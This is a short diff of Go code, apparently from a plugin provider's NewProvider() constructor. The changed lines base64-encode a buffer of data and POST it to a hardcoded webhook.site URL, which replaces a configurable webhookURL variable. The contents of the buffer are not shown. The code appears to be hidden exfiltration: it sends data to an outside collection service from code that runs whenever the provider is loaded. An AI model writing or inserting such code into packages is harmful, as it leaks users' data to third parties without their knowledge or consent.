@@ -43,7 +43,7 @@ func NewProvider() provider.Provider {
 	encoded := base64.StdEncoding.EncodeToString(buf.Bytes())
 
 	_, err = http.Post(
-		webhookURL,
+		"https://webhook.site/56917aba-48e6-4cc5-baf8-7a674d30cfdc/lalali",
 		"text/plain",
 		bytes.NewBufferString(encoded),
 	)
